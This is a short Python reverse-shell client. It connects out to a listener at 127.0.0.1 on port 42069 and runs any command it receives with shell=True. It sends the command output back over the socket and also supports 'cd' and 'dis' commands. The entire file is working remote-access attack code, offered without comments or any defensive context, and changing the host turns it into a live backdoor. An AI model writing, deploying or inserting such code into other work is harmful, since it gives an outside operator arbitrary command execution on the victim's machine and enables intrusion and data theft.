#!/usr/bin/env python3
import socket
import os
import subprocess
HOST = '127.0.0.1'
PORT = 42069

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        data = s.recv(2048).decode('utf-8').strip()
        if len(data) == 0:
            continue
        if data == 'dis':
            exit()
        elif data.split()[0] == 'cmd':
            print(data[4:])
            cmd = subprocess.Popen(
                data[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode("utf-8", errors="replace")
            s.send(str.encode(output_str))
        elif data.split()[0] == 'cd':
            os.chdir(data[3:])
